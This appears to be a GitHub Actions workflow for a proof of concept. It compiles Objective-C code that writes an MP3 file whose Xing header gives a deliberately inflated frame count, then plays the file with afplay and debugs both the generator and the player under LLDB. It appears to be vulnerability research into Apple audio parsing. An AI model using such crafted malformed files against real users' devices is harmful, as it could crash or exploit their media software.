name: Generate, Play, and Debug Audio Source
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch: # Allows manual triggering

jobs:
  build-generate-and-debug:
    runs-on: macos-latest

    steps:
      # Clone the repository
      - name: Clone repository
        run: git clone https://github.com/encryptedcoderr/AppleTest/

      # Navigate to the correct directory
      - name: Navigate to working directory
        run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l

      # Patch encodeme.mm with the source that creates an invalid MP3
      - name: Patch encodeme.mm to create invalid MP3
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Patching encodeme.mm with faulty MP3 generation logic..."
          cat > encodeme.mm << 'EOF'
          #import <Foundation/Foundation.h>

          int main(int argc, const char * argv[]) {
              @autoreleasepool {
                  time_t startTime = time(NULL);
                  fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));

                  // Fixed: Removed unused variables from stringWithFormat to resolve compiler warning.
                  NSString *fileName = @"output_invalid.mp3";
                  FILE *file = fopen(fileName.UTF8String, "wb");
                  if (!file) {
                      fprintf(stderr, "Failed to create file: %s\n", fileName.UTF8String);
                      return 1;
                  }

                  // The core of the issue: Mismatched frame counts
                  UInt32 totalFrames = 10000; // Inflated value for the header
                  UInt32 actualFrames = 1000;  // Actual number of frames to be written

                  // Write a misleading Xing header
                  char xingHeader[100] = {0};
                  memcpy(xingHeader, "Xing", 4);
                  xingHeader[7] = 0x01; // Frames field present
                  xingHeader[8] = totalFrames >> 24;
                  xingHeader[9] = (totalFrames >> 16) & 0xFF;
                  xingHeader[10] = (totalFrames >> 8) & 0xFF;
                  xingHeader[11] = totalFrames & 0xFF;
                  
                  // This is the line where the invalid data is written
                  fwrite(xingHeader, 1, sizeof(xingHeader), file);

                  // Write dummy MP3 frames
                  char frameHeader[4] = {0xFF, 0xFB, 0x90, 0x00}; // 44.1kHz, 128kbps, stereo
                  for (UInt32 i = 0; i < actualFrames; ++i) {
                      fwrite(frameHeader, 1, sizeof(frameHeader), file);
                      char dummyData[400] = {0}; // Simplified dummy frame data
                      fwrite(dummyData, 1, sizeof(dummyData), file);
                  }
                  fprintf(stderr, "PoC: Wrote Xing header with %u frames, but actual frames written was %u\n", totalFrames, actualFrames);

                  fclose(file);

                  time_t endTime = time(NULL);
                  fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
              }
              return 0;
          }
          EOF

      # Set up Xcode
      - name: Set up Xcode
        uses: maxim-lobanov/setup-xcode@v1
        with:
          xcode-version: '15.4'

      # Compile encodeme.mm with debug symbols
      - name: Compile encodeme.mm for Debugging
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          echo "Compiling encodeme.mm with debug symbols (-g)..."
          clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_debug
          if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi

      # NEW: Debug the file generation process itself with LLDB
      - name: Debug File Generation with LLDB
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          LOG_FILE="generation_debug_log.txt"
          echo "--- Debugging File Generation Process ---" > $LOG_FILE
          echo "Timestamp: $(date)" >> $LOG_FILE
          
          echo "Creating LLDB command script..."
          # Improved: Create a command script for LLDB for better reliability in CI.
          # This avoids potential permission issues with direct process attachment/control.
          cat > debug_script.lldb << 'EOF'
          breakpoint set --file encodeme.mm --line 29
          run
          echo "--- Breakpoint Hit: Inspecting variables before fwrite() ---"
          p totalFrames
          p actualFrames
          p xingHeader
          continue
          quit
          EOF
          
          echo "Starting LLDB session with script to inspect the invalid header creation..." >> $LOG_FILE
          # Improved: Execute LLDB with the script file.
          lldb -s debug_script.lldb ./encodeme_debug >> $LOG_FILE 2>&1
            
          echo "✅ Generation debug log created. Displaying contents:"
          cat $LOG_FILE
          
      # Play the generated (invalid) file and debug the player
      - name: Play and Debug Audio Player
        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
        run: |
          PLAYER_LOG_FILE="player_debug_log.txt"
          echo "--- Debugging Audio Player (afplay) ---" > $PLAYER_LOG_FILE
          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE

          echo "Starting audio playback in background..."
          afplay output_invalid.mp3 &
          MP3_PID=$!
          echo "Started MP3 playback with PID: $MP3_PID" >> $PLAYER_LOG_FILE
          sleep 2

          echo "--- Attaching LLDB to MP3 Player Process (PID: $MP3_PID) ---" >> $PLAYER_LOG_FILE
          lldb -p $MP3_PID --batch -o 'bt' -o 'detach' -o 'quit' >> $PLAYER_LOG_FILE 2>&1 || echo "Could not attach to MP3 player process. It may have crashed or finished." >> $PLAYER_LOG_FILE

          echo "✅ Player debug log created. Displaying contents:"
          cat $PLAYER_LOG_FILE

      # Upload all artifacts: the invalid MP3 and both debug logs
      - name: Upload All Artifacts
        uses: actions/upload-artifact@v4
        with:
          name: audio-and-debug-artifacts
          path: |
            AppleTest/apple-positional-audio-codec-invalid-header-main/output_invalid.mp3
            AppleTest/apple-positional-audio-codec-invalid-header-main/generation_debug_log.txt
            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
          retention-days: 7
          if-no-files-found: error
